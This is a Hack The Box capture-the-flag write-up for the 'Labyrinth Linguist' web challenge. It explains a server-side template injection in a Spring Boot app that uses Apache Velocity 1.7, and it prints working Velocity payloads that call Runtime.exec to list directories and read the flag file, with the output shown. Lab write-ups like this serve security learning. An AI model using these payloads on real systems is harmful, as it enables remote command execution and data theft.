---
clayout: ctf
title: Labyrinth Linguist
date: 2024-12-29
image: /icon/hack-the-box/web.svg
type: Hack The Box

ctf:
    - name: Labyrinth Linguist
      link: https://app.hackthebox.com/challenges/649
      thumbnail: /ctf/hack-the-box/challenges/web/labyrinth-linguist/overview.png
      pwned:
        - link: https://www.hackthebox.com/achievement/challenge/585215/649
          thumbnail: /ctf/hack-the-box/challenges/web/labyrinth-linguist/pwned.png
---

## Challenge Description

You and your faction find yourselves cornered in a refuge corridor inside a maze while being chased by a KORP mutant
exterminator. While planning your next move you come across a translator device left by previous Fray competitors, it is
used for translating english to voxalith, an ancient language spoken by the civilization that originally built the maze.
It is known that voxalith was also spoken by the guardians of the maze that were once benign but then were turned
against humans by a corrupting agent KORP devised. You need to reverse engineer the device in order to make contact with
the mutant and claim your last chance to make it out alive.

## Challenge Overview

This challenge presents a web application that simulates a translator for converting text into a fictional language
called **Voxalith**. Users can input text into a field, submit it, and view the translated output displayed on the page.

The application uses **Spring Boot** and **Apache Velocity** for templating, which is vulnerable to **Server-Side
Template Injection (SSTI)**. The objective is to exploit this vulnerability to execute arbitrary commands and retrieve
the flag.

## Code Review

### Technology Stack

- **Framework**: Spring Boot
- **Templating Engine**: Apache Velocity
- **Dependencies**:
  ```xml
  <dependency>
      <groupId>org.apache.velocity</groupId>
      <artifactId>velocity</artifactId>
      <version>1.7</version>
  </dependency>
  ```

The application leverages Apache Velocity for dynamic template rendering. The outdated version (1.7) is vulnerable to
SSTI, as identified in [CVE-2020-13936](https://www.mend.io/vulnerability-database/CVE-2020-13936).

### Main.java

The `Main.java` file contains the core logic, including the `/` endpoint that handles text input for translation.

#### Relevant Code Snippet:

```java
@RequestMapping("/")
@ResponseBody
String index(@RequestParam(required = false, name = "text") String textString) {
    if (textString == null) {
        textString = "Example text";
    }

    String template = "";

    try {
        template = readFileToString("/app/src/main/resources/templates/index.html", textString);
    } catch (IOException e) {
        e.printStackTrace();
    }

    RuntimeServices runtimeServices = RuntimeSingleton.getRuntimeServices();
    StringReader reader = new StringReader(template);

    org.apache.velocity.Template t = new org.apache.velocity.Template();
    t.setRuntimeServices(runtimeServices);
    try {
        t.setData(runtimeServices.parse(reader, "home"));
        t.initDocument();
        VelocityContext context = new VelocityContext();
        context.put("name", "World");

        StringWriter writer = new StringWriter();
        t.merge(context, writer);
        template = writer.toString();
    } catch (ParseException e) {
        e.printStackTrace();
    }

    return template;
}
```

#### Key Observations:

1. **Template Injection Point**:
    - The `textString` parameter is directly passed into the Velocity template engine without sanitization, making it
      vulnerable to SSTI.

2. **Dynamic Rendering**:
    - The `VelocityContext` dynamically renders templates, providing an entry point for executing malicious payloads.

## Exploitation: Server-Side Template Injection (SSTI)

### Vulnerability

Apache Velocity 1.7 is vulnerable to SSTI, allowing attackers to execute arbitrary Java code by injecting malicious
payloads into templates. The `textString` parameter serves as the injection point in this challenge.

### Proof of Concept (PoC)

#### Objective

Verify if the application processes injected Velocity expressions.

#### Payload:

```java
#set($x='<h1>Server-Side Template Injection</h1>') $x
```

#### Methodology:

1. Submit the payload through the input field or intercept the request using **Burp Suite**.
2. Observe the processed response. The presence of the `<h1>` tag in the output confirms SSTI vulnerability.

### Retrieving the Flag

#### Exploit Strategy

To retrieve the flag, we can inject a payload that executes arbitrary system commands. The following payload executes
the `ls /` command to list directory contents:

```java
#set($x='')##
#set($str=$x.class.forName("java.lang.String"))##
#set($chr=$x.class.forName("java.lang.Character"))##
#set($ex=$x.class.forName("java.lang.Runtime").getRuntime().exec('ls /'))##
$ex.waitFor()
#set($out=$ex.getInputStream())##
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

#### Result:

The output reveals the directory structure, including the flag file:

```
<h2 class="fire">0
app
bin
boot
dev
entrypoint.sh
etc
flagc4daff00be.txt
home
lib
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
</h2>
```

#### Reading the Flag

Using the following payload, we can read the content of `flagc4daff00be.txt`:

```java
#set($x='')##
#set($str=$x.class.forName("java.lang.String"))##
#set($chr=$x.class.forName("java.lang.Character"))##
#set($ex=$x.class.forName("java.lang.Runtime").getRuntime().exec('cat /flagc4daff00be.txt'))##
$ex.waitFor()
#set($out=$ex.getInputStream())##
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

#### Result:

The server returns the flag in the response:

```
HTB{f4k3_fl4g_f0r_t35t1ng}
```

We successfully exploited the SSTI vulnerability in Apache Velocity to retrieve the flag! 🎉

## References

- [Apache Velocity SSTI - CVE-2020-13936](https://www.mend.io/vulnerability-database/CVE-2020-13936)
- [PortSwigger - SSTI Explained](https://portswigger.net/web-security/server-side-template-injection)
- [HackTricks - SSTI Exploitation](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
- [Gosecure - Template Injection Workshop](https://gosecure.github.io/template-injection-workshop/#6)
- [Antgarsil - Velocity](https://antgarsil.github.io/posts/velocity/)